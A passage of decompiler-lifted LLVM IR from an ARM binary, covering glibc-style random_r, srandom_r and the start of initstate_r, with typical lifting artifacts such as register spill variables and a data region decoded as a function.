  %v2_15438 = icmp eq i32 %v3_15430, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_15438, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_154441 = add i32 %tmp, 8
  %v2_154442 = inttoptr i32 %v1_154441 to i32*
  %v3_154443 = load i32, i32* %v2_154442, align 4
  store i32 %v3_154443, i32* %r1.global-to-local, align 4
  %v3_15458 = add i32 %v3_154443, -4
  %v4_15458 = inttoptr i32 %v3_15458 to i32*
  store i32 0, i32* %v4_15458, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_15440 = add i32 %tmp, 4
  %v3_15440 = inttoptr i32 %v2_15440 to i32*
  %v4_15440 = load i32, i32* %v3_15440, align 4
  %v1_15444 = add i32 %tmp, 8
  %v2_15444 = inttoptr i32 %v1_15444 to i32*
  %v3_15444 = load i32, i32* %v2_15444, align 4
  store i32 %v3_15444, i32* %r1.global-to-local, align 4
  %v3_15448 = sub i32 %v4_15440, %v3_15444
  %v4_1544c = sdiv i32 %v3_15448, 4
  %v4_15454 = mul i32 %v4_1544c, 5
  %v5_15454 = add i32 %v4_15454, %v3_15430
  %v3_1545c = add i32 %v3_15444, -4
  %v4_1545c = inttoptr i32 %v3_1545c to i32*
  store i32 %v5_15454, i32* %v4_1545c, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_15460 = add i32 %arg1, 4
  store i32 %v1_15460, i32* %r6.global-to-local, align 4
  %v2_15464 = inttoptr i32 %arg1 to i32*
  %v3_15464 = load i32, i32* %v2_15464, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_1546c = srem i32 %v3_15464, 5
  store i32 %v2_1546c, i32* %r0.global-to-local, align 4
  %v2_15478 = and i32 %v2_1546c, 1073741824
  %v3_15478 = icmp ne i32 %v2_15478, 0
  %v4_15478 = mul nsw i32 %v2_1546c, 4
  %v2_1547c = icmp ne i32 %v2_1546c, 4
  %v3_1547c = and i1 %v3_15478, %v2_1547c
  br i1 %v3_1547c, label %dec_label_pc_154d8, label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %bb
  %v5_15478 = add i32 %v4_15478, ptrtoint (i32* @global_var_20b70.1182 to i32)
  %v1_15480 = add i32 %v4_15478, add (i32 ptrtoint (i32* @global_var_20b70.1182 to i32), i32 20)
  %v2_15480 = inttoptr i32 %v1_15480 to i32*
  %v3_15480 = load i32, i32* %v2_15480, align 4
  store i32 %v3_15480, i32* %r5.global-to-local, align 4
  %v6_15484 = inttoptr i32 %v5_15478 to i32*
  %v7_15484 = load i32, i32* %v6_15484, align 4
  store i32 %v7_15484, i32* %r7.global-to-local, align 4
  %v2_15488 = icmp eq i32 %v2_1546c, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_15490 = load i32, i32* %r4.global-to-local, align 4
  %v2_15490 = add i32 %v1_15490, 16
  %v3_15490 = inttoptr i32 %v2_15490 to i32*
  store i32 %v3_15480, i32* %v3_15490, align 4
  %v0_15494 = load i32, i32* %r7.global-to-local, align 4
  %v1_15494 = load i32, i32* %r4.global-to-local, align 4
  %v2_15494 = add i32 %v1_15494, 20
  %v3_15494 = inttoptr i32 %v2_15494 to i32*
  store i32 %v0_15494, i32* %v3_15494, align 4
  %v0_15498 = load i32, i32* %r0.global-to-local, align 4
  %v1_15498 = load i32, i32* %r4.global-to-local, align 4
  %v2_15498 = add i32 %v1_15498, 12
  %v3_15498 = inttoptr i32 %v2_15498 to i32*
  store i32 %v0_15498, i32* %v3_15498, align 4
  br i1 %v2_15488, label %dec_label_pc_154c4, label %dec_label_pc_154a0

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15480
  %v0_154a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_154a0 = add i32 %v0_154a0, -4
  %v2_154a0 = inttoptr i32 %v1_154a0 to i32*
  %v3_154a0 = load i32, i32* %v2_154a0, align 4
  %v1_154a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_154a4 = sdiv i32 %v3_154a0, %v1_154a4
  store i32 %v2_154a4, i32* %r0.global-to-local, align 4
  %v4_154a8 = mul i32 %v2_154a4, 4
  %v5_154a8 = add i32 %v4_154a8, %v0_154a0
  %v1_154ac = load i32, i32* %r4.global-to-local, align 4
  %v2_154ac = add i32 %v1_154ac, 4
  %v3_154ac = inttoptr i32 %v2_154ac to i32*
  store i32 %v5_154a8, i32* %v3_154ac, align 4
  %v0_154b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_154b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_154b0 = add i32 %v1_154b0, %v0_154b0
  %v0_154b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_154b4, i32* %r1.global-to-local, align 4
  %v2_154b8 = srem i32 %v2_154b0, %v0_154b4
  %v0_154bc = load i32, i32* %r6.global-to-local, align 4
  %v4_154bc = mul i32 %v2_154b8, 4
  %v5_154bc = add i32 %v0_154bc, %v4_154bc
  store i32 %v5_154bc, i32* %r0.global-to-local, align 4
  %v1_154c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_154c0 = inttoptr i32 %v1_154c0 to i32*
  store i32 %v5_154bc, i32* %v2_154c0, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_15480, %dec_label_pc_154a0
  %v0_154c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_154c4 = load i32, i32* %r5.global-to-local, align 4
  %v4_154c4 = mul i32 %v1_154c4, 4
  %v5_154c4 = add i32 %v4_154c4, %v0_154c4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_154cc = load i32, i32* %r4.global-to-local, align 4
  %v2_154cc = add i32 %v1_154cc, 24
  %v3_154cc = inttoptr i32 %v2_154cc to i32*
  store i32 %v5_154c4, i32* %v3_154cc, align 4
  %v0_154d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_154d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_154d0 = add i32 %v1_154d0, 8
  %v3_154d0 = inttoptr i32 %v2_154d0 to i32*
  store i32 %v0_154d0, i32* %v3_154d0, align 4
  %v2_154d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_154d4, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_154d8:                               ; preds = %bb
  %v0_154d8 = call i32 @__errno_location()
  %v2_154e0 = inttoptr i32 %v0_154d8 to i32*
  store i32 22, i32* %v2_154e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_154e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_154e8, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_1546c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_154c4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_154f0 = add i32 %tmp, 12
  %v2_154f0 = inttoptr i32 %v1_154f0 to i32*
  %v3_154f0 = load i32, i32* %v2_154f0, align 4
  store i32 %v3_154f0, i32* %r3.global-to-local, align 4
  %v2_154f4 = icmp eq i32 %v3_154f0, 0
  %v3_154f8 = load i32, i32* @r4, align 4
  store i32 %v3_154f8, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_15504 = add i32 %tmp, 8
  %v2_15504 = inttoptr i32 %v1_15504 to i32*
  %v3_15504 = load i32, i32* %v2_15504, align 4
  store i32 %v3_15504, i32* %lr.global-to-local, align 4
  br i1 %v2_154f4, label %dec_label_pc_1550c, label %dec_label_pc_15530

dec_label_pc_1550c:                               ; preds = %entry
  %v1_1550c = inttoptr i32 %v3_15504 to i32*
  %v2_1550c = load i32, i32* %v1_1550c, align 4
  store i32 %v2_1550c, i32* %r2.global-to-local, align 4
  %v2_15514 = mul i32 %v2_1550c, 1103515245
  %v1_1551c = add i32 %v2_15514, 12345
  %tmp10 = bitcast i32 %v1_1551c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_15520 = bitcast float %tmp11 to i32
  store i32 %v1_15520, i32* %r3.global-to-local, align 4
  store i32 %v1_15520, i32* %v1_1550c, align 4
  %v0_15528 = load i32, i32* %r3.global-to-local, align 4
  %v2_15528 = inttoptr i32 %arg2 to i32*
  store i32 %v0_15528, i32* %v2_15528, align 4
  br label %dec_label_pc_15574

dec_label_pc_15530:                               ; preds = %entry
  %v2_15530 = load i32, i32* %arg1, align 4
  store i32 %v2_15530, i32* %r2.global-to-local, align 4
  %v1_15534 = add i32 %tmp, 4
  %v2_15534 = inttoptr i32 %v1_15534 to i32*
  %v3_15534 = load i32, i32* %v2_15534, align 4
  store i32 %v3_15534, i32* %r0.global-to-local, align 4
  %v1_15538 = inttoptr i32 %v2_15530 to i32*
  %v2_15538 = load i32, i32* %v1_15538, align 4
  store i32 %v2_15538, i32* %r3.global-to-local, align 4
  %v1_1553c = inttoptr i32 %v3_15534 to i32*
  %v2_1553c = load i32, i32* %v1_1553c, align 4
  %v4_1553c = add i32 %v3_15534, 4
  store i32 %v4_1553c, i32* %r0.global-to-local, align 4
  %v2_15540 = add i32 %v2_1553c, %v2_15538
  store i32 %v2_15540, i32* %r3.global-to-local, align 4
  store i32 %v2_15540, i32* %v1_15538, align 4
  %v3_15544 = load i32, i32* %r2.global-to-local, align 4
  %v4_15544 = add i32 %v3_15544, 4
  store i32 %v4_15544, i32* %r2.global-to-local, align 4
  %v0_15548 = load i32, i32* %ip.global-to-local, align 4
  %v1_15548 = add i32 %v0_15548, 24
  %v2_15548 = inttoptr i32 %v1_15548 to i32*
  %v3_15548 = load i32, i32* %v2_15548, align 4
  store i32 %v3_15548, i32* %r4.global-to-local, align 4
  %v0_1554c = load i32, i32* %r3.global-to-local, align 4
  %v3_1554c = udiv i32 %v0_1554c, 2
  store i32 %v3_1554c, i32* %r3.global-to-local, align 4
  %v3_15550 = icmp ult i32 %v4_15544, %v3_15548
  %v1_15554 = load i32, i32* %r5.global-to-local, align 4
  %v2_15554 = inttoptr i32 %v1_15554 to i32*
  store i32 %v3_1554c, i32* %v2_15554, align 4
  br i1 %v3_15550, label %dec_label_pc_15564, label %bb

bb:                                               ; preds = %dec_label_pc_15530
  %v1_15558 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_15558, i32* %r2.global-to-local, align 4
  %v0_1555c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1555c, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_15564:                               ; preds = %dec_label_pc_15530
  %v0_1555c1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1555c1, i32* %r3.global-to-local, align 4
  %v1_15564 = load i32, i32* %r4.global-to-local, align 4
  %v3_15564 = icmp ult i32 %v0_1555c1, %v1_15564
  br i1 %v3_15564, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_15564
  store i32 %v0_1555c1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_15564
  %v1_1556c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1556c, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_15570 = load i32, i32* %ip.global-to-local, align 4
  %v1_15570 = inttoptr i32 %v0_15570 to i32*
  %v2_15570 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_15570, i32* %v1_15570, align 4
  %v3_15570 = add i32 %v0_15570, 4
  %v4_15570 = inttoptr i32 %v3_15570 to i32*
  %v5_15570 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15570, i32* %v4_15570, align 4
  br label %dec_label_pc_15574

dec_label_pc_15574:                               ; preds = %dec_label_pc_1550c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_15578 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15578, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1555c1, { 1, 0, 2 }
  uselistorder i32 %v3_1554c, { 1, 0 }
  uselistorder i32 %v1_15520, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_15574, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15580 = load i32, i32* @r4, align 4
  store i32 %v3_15580, i32* %stack_var_-32, align 4
  %v6_15580 = load i32, i32* @r5, align 4
  %v1_15584 = add i32 %tmp, 12
  %v2_15584 = inttoptr i32 %v1_15584 to i32*
  %v3_15584 = load i32, i32* %v2_15584, align 4
  %v2_1558c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_15584, 4
  br i1 %tmp29, label %.dec_label_pc_15638_crit_edge, label %dec_label_pc_1559c

.dec_label_pc_15638_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_15638

dec_label_pc_1559c:                               ; preds = %entry
  %v0_1559c = load i32, i32* @r0, align 4
  %v2_1559c = icmp eq i32 %v0_1559c, 0
  %v1_155a0 = add i32 %tmp, 8
  %v2_155a0 = inttoptr i32 %v1_155a0 to i32*
  %v3_155a0 = load i32, i32* %v2_155a0, align 4
  store i32 %v3_155a0, i32* %r7.global-to-local, align 4
  br i1 %v2_1559c, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1559c
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1559c, %bb
  %v0_155ac = phi i32 [ %v0_1559c, %dec_label_pc_1559c ], [ 1, %bb ]
  %v2_155a8 = icmp eq i32 %v3_15584, 0
  %v2_155ac = inttoptr i32 %v3_155a0 to i32*
  store i32 %v0_155ac, i32* %v2_155ac, align 4
  br i1 %v2_155a8, label %dec_label_pc_15634, label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %bb21
  %v1_155b4 = add i32 %tmp, 16
  %v2_155b4 = inttoptr i32 %v1_155b4 to i32*
  %v3_155b4 = load i32, i32* %v2_155b4, align 4
  store i32 %v3_155b4, i32* %sb.global-to-local, align 4
  %v0_155b8 = load i32, i32* @r0, align 4
  %v0_155bc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_155bc, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1560423 = icmp sgt i32 %v3_155b4, 1
  br i1 %v5_1560423, label %dec_label_pc_155c8, label %dec_label_pc_15608

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155b4, %dec_label_pc_155c8
  %v0_155d825 = phi i32 [ %v0_155f8.pre, %dec_label_pc_155c8 ], [ %v0_155b8, %dec_label_pc_155b4 ]
  %v1_155f024 = phi i32 [ %v5_155f0, %dec_label_pc_155c8 ], [ %v0_155bc, %dec_label_pc_155b4 ]
  %v2_155c8 = srem i32 %v0_155d825, ptrtoint ([5 x i8]* @global_var_1f31d.1186 to i32)
  %v2_155d4 = mul i32 %v2_155c8, 16807
  %v2_155dc = sdiv i32 %v0_155d825, ptrtoint ([5 x i8]* @global_var_1f31d.1186 to i32)
  %tmp30 = mul i32 %v2_155dc, -2836
  %v2_155e8 = add i32 %v2_155d4, %tmp30
  %v8_155e8 = icmp slt i32 %v2_155e8, 0
  %v2_155ec = add i32 %v2_155e8, 2147483647
  %v2_155ec.v2_155e8 = select i1 %v8_155e8, i32 %v2_155ec, i32 %v2_155e8
  store i32 %v2_155ec.v2_155e8, i32* @r5, align 4
  %v2_155f0 = add i32 %v1_155f024, 4
  %v3_155f0 = inttoptr i32 %v2_155f0 to i32*
  store i32 %v2_155ec.v2_155e8, i32* %v3_155f0, align 4
  %v4_155f0 = load i32, i32* %sl.global-to-local, align 4
  %v5_155f0 = add i32 %v4_155f0, 4
  store i32 %v5_155f0, i32* %sl.global-to-local, align 4
  %v0_155f4.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_155f4.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_155f8.pre = load i32, i32* @r5, align 4
  %v1_15600 = add i32 %v0_155f4.pre, 1
  store i32 %v1_15600, i32* %r8.global-to-local, align 4
  %v5_15604 = icmp slt i32 %v0_155f4.pre, %v1_155f4.pre
  br i1 %v5_15604, label %dec_label_pc_155c8, label %dec_label_pc_155f4.dec_label_pc_15608_crit_edge

dec_label_pc_155f4.dec_label_pc_15608_crit_edge:  ; preds = %dec_label_pc_155c8
  %v0_15614.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_155f4.dec_label_pc_15608_crit_edge, %dec_label_pc_155b4
  %v0_15614 = phi i32 [ %v0_15614.pre, %dec_label_pc_155f4.dec_label_pc_15608_crit_edge ], [ %v0_155bc, %dec_label_pc_155b4 ]
  %v0_1560c.lcssa = phi i32 [ %v1_155f4.pre, %dec_label_pc_155f4.dec_label_pc_15608_crit_edge ], [ %v3_155b4, %dec_label_pc_155b4 ]
  %v2_1560c = mul i32 %v0_1560c.lcssa, 10
  store i32 %v2_1560c, i32* @r4, align 4
  %v0_15610 = load i32, i32* %r6.global-to-local, align 4
  %v1_15610 = add i32 %v0_15610, 20
  %v2_15610 = inttoptr i32 %v1_15610 to i32*
  %v3_15610 = load i32, i32* %v2_15610, align 4
  %v4_15614 = mul i32 %v3_15610, 4
  %v5_15614 = add i32 %v0_15614, %v4_15614
  %v1_15618 = inttoptr i32 %v0_15610 to i32*
  store i32 %v5_15614, i32* %v1_15618, align 4
  %v3_15618 = add i32 %v0_15610, 4
  %v4_15618 = inttoptr i32 %v3_15618 to i32*
  %v5_15618 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_15618, i32* %v4_15618, align 4
  br label %dec_label_pc_15624

dec_label_pc_15620:                               ; preds = %dec_label_pc_15624
  %v0_15628 = load i32, i32* %r6.global-to-local, align 4
  %v2_15620 = inttoptr i32 %v0_15628 to i32*
  %v3_15620 = call i32 @__GI_random_r(i32* %v2_15620, i32 %v2_1558c)
  br label %dec_label_pc_15624

dec_label_pc_15624:                               ; preds = %dec_label_pc_15608, %dec_label_pc_15620
  %v0_15624 = load i32, i32* @r4, align 4
  %v1_15624 = add i32 %v0_15624, -1
  store i32 %v1_15624, i32* @r4, align 4
  %v6_15624 = icmp slt i32 %v1_15624, 0
  br i1 %v6_15624, label %dec_label_pc_15634, label %dec_label_pc_15620

dec_label_pc_15634:                               ; preds = %dec_label_pc_15624, %bb21
  %v2_1563c.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %.dec_label_pc_15638_crit_edge, %dec_label_pc_15634
  %v2_1563c = phi i32 [ %v3_15580, %.dec_label_pc_15638_crit_edge ], [ %v2_1563c.pre, %dec_label_pc_15634 ]
  %v26_1563c = phi i32 [ -1, %.dec_label_pc_15638_crit_edge ], [ 0, %dec_label_pc_15634 ]
  store i32 %v2_1563c, i32* @r4, align 4
  store i32 %v6_15580, i32* @r5, align 4
  ret i32 %v26_1563c

; uselistorder directives
  uselistorder i32 %v1_15624, { 1, 0 }
  uselistorder i32 %v0_15610, { 1, 0, 2 }
  uselistorder i32 %v0_155f4.pre, { 1, 0 }
  uselistorder i32 %v5_155f0, { 1, 0 }
  uselistorder i32 %v2_155e8, { 2, 1, 0 }
  uselistorder i32 %v0_155d825, { 1, 0 }
  uselistorder i32 %v0_155bc, { 1, 0, 2 }
  uselistorder i32 %v3_155b4, { 1, 0, 2 }
  uselistorder i32 %v3_15584, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 3, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1f31d.1186 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_15638, { 1, 0 }
  uselistorder label %dec_label_pc_15624, { 1, 0 }
  uselistorder label %dec_label_pc_155c8, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15640:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_15640 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15640, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_15640
  %v2_15640 = load i32, i32* @r7, align 4
  %v5_15640 = udiv i32 %v2_15640, 8
  %v6_15640 = and i32 %v5_15640, %arg1
  store i32 %v6_15640, i32* %r4.global-to-local, align 4
  %v2_15644 = load i32, i32* @sp, align 4
  %v8_15644 = shl i32 %v2_15644, %arg3
  %v9_15644 = and i32 %v8_15644, %arg2
  call void @__pseudo_branch(i32 %v9_15644)
  %v0_15648.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_15648 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_15648.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_15648 = load i32, i32* %r4.global-to-local, align 4
  %v3_15648 = load i32, i32* @fp, align 4
  %v8_15648 = shl i32 %v2_15648, %v3_15648
  %v9_15648 = and i32 %v8_15648, %v1_15648
  store i32 %v9_15648, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_15640, %bb
  %v10_15648 = phi i32 [ %arg1, %dec_label_pc_15640 ], [ %v9_15648, %bb ], [ %v1_15648, %.thread ]
  ret i32 %v10_15648

; uselistorder directives
  uselistorder i32 %v1_15648, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15650 = load i32, i32* @r4, align 4
  store i32 %v3_15650, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg3, 128
  br i1 %tmp28, label %dec_label_pc_15670, label %dec_label_pc_15660

dec_label_pc_15660:                               ; preds = %entry
  %v2_15660 = icmp ugt i32 %arg3, 254
  %v7_15660 = icmp eq i32 %arg3, 255
  %v2_15664 = xor i1 %v7_15660, true
  %v3_15664 = and i1 %v2_15660, %v2_15664
  br i1 %v3_15664, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_15660
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15660, %bb
  %v1_156987 = phi i32 [ %v3_15650, %dec_label_pc_15660 ], [ 4, %bb ]
  %v2_15668 = xor i1 %v2_15660, true
  %v3_15668 = or i1 %v7_15660, %v2_15668
  br i1 %v3_15668, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_15670:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg3, 31
  br i1 %tmp29, label %dec_label_pc_15688, label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %dec_label_pc_15670
  %tmp30 = icmp ugt i32 %arg3, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_156f4

.thread10:                                        ; preds = %dec_label_pc_15678
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_15688:                               ; preds = %dec_label_pc_15670
  %v2_15688 = icmp ugt i32 %arg3, 62
  %v7_15688 = icmp eq i32 %arg3, 63
  %v2_1568c = xor i1 %v7_15688, true
  %v3_1568c = and i1 %v2_15688, %v2_1568c
  br i1 %v3_1568c, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_15688
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_15688, %bb22
  %v1_156986 = phi i32 [ %v3_15650, %dec_label_pc_15688 ], [ 2, %bb22 ]
  %v2_15690 = xor i1 %v2_15688, true
  %v3_15690 = or i1 %v7_15688, %v2_15690
  br i1 %v3_15690, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_156a0 = phi i32 [ 3, %bb21 ], [ %v1_156987, %bb20 ], [ %v1_156986, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_20b70.1182 to i32), i32* %r2.global-to-local, align 4
  %v4_15698 = mul i32 %v1_156a0, 4
  %v5_15698 = add i32 %v4_15698, ptrtoint (i32* @global_var_20b70.1182 to i32)
  store i32 %v5_15698, i32* %r3.global-to-local, align 4
  %v1_1569c = add i32 %v4_15698, add (i32 ptrtoint (i32* @global_var_20b70.1182 to i32), i32 20)
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  store i32 %v3_1569c, i32* %r1.global-to-local, align 4
  %v6_156a0 = inttoptr i32 %v5_15698 to i32*
  %v7_156a0 = load i32, i32* %v6_156a0, align 4
  store i32 %v7_156a0, i32* %r2.global-to-local, align 4
  %v1_156a4 = add i32 %tmp, 4
  store i32 %v1_156a4, i32* @r6, align 4
  %v4_156a8 = mul i32 %v3_1569c, 4
  %v5_156a8 = add i32 %v4_156a8, %v1_156a4
  store i32 %v5_156a8, i32* %r3.global-to-local, align 4
  %v2_156ac = add i32 %arg4, 24
  %v3_156ac = inttoptr i32 %v2_156ac to i32*
  store i32 %v5_156a8, i32* %v3_156ac, align 4
  %v0_156b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_156b0 = load i32, i32* @r5, align 4
  %v2_156b0 = add i32 %v1_156b0, 20
  %v3_156b0 = inttoptr i32 %v2_156b0 to i32*
  store i32 %v0_156b0, i32* %v3_156b0, align 4
  %v0_156b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_156b4 = load i32, i32* @r5, align 4
  %v2_156b4 = add i32 %v1_156b4, 16
  %v3_156b4 = inttoptr i32 %v2_156b4 to i32*
  store i32 %v0_156b4, i32* %v3_156b4, align 4
  %v0_156b8 = load i32, i32* @r4, align 4
  %v1_156b8 = load i32, i32* @r5, align 4
  %v2_156b8 = add i32 %v1_156b8, 12
  %v3_156b8 = inttoptr i32 %v2_156b8 to i32*
  store i32 %v0_156b8, i32* %v3_156b8, align 4
  %v0_156bc = load i32, i32* @r6, align 4
  %v1_156bc = load i32, i32* @r5, align 4
  %v2_156bc = add i32 %v1_156bc, 8
  %v3_156bc = inttoptr i32 %v2_156bc to i32*
  store i32 %v0_156bc, i32* %v3_156bc, align 4
  %v0_156c0 = load i32, i32* @r5, align 4
  store i32 %v0_156c0, i32* %r1.global-to-local, align 4
  %v2_156c4 = inttoptr i32 %arg1 to i32*
  %v3_156c4 = call i32 @srandom_r(i32* %v2_156c4, i32 %v0_156c0)
  store i32 %v3_156c4, i32* %r0.global-to-local, align 4
  %v0_156c8 = load i32, i32* @r4, align 4
  %v2_156c8 = icmp eq i32 %v0_156c8, 0
  br i1 %v2_156c8, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_156e412 = load i32, i32* @r7, align 4
  %v2_156e413 = inttoptr i32 %v1_156e412 to i32*
  store i32 0, i32* %v2_156e413, align 4
  %v1_156e8 = load i32, i32* @r4, align 4
  store i32 %v1_156e8, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_156cc = load i32, i32* @r5, align 4
  %v2_156cc = add i32 %v1_156cc, 4
  %v3_156cc = inttoptr i32 %v2_156cc to i32*
  %v4_156cc = load i32, i32* %v3_156cc, align 4
